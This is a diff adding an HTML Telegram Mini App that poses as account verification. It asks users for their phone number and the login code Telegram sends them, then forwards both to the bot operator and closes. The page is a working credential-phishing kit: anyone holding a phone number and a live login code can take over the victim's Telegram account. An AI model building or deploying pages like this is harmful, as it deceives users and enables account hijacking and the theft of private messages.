@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verification Mini App</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; padding: 20px; }
+        input { display: block; margin: 10px 0; padding: 5px; width: 100%; }
+        button { padding: 10px; background: #0088cc; color: white; border: none; }
+    </style>
+</head>
+<body>
+    <h2>Verify Your Telegram Account</h2>
+    <input type="text" id="phone" placeholder="Phone Number (e.g., +1234567890)">
+    <input type="text" id="code" placeholder="Verification Code (sent to your Telegram)">
+    <button onclick="submitVerification()">Submit</button>
+
+    <script>
+        window.Telegram.WebApp.ready();
+        function submitVerification() {
+            const phone = document.getElementById('phone').value;
+            const code = document.getElementById('code').value;
+            if (phone && code) {
+                const data = JSON.stringify({ phone: phone, code: code });
+                window.Telegram.WebApp.sendData(data);
+                window.Telegram.WebApp.close();
+            } else {
+                alert("Please enter both phone number and code.");
+            }
+        }
+    </script>
+</body>
+</html>
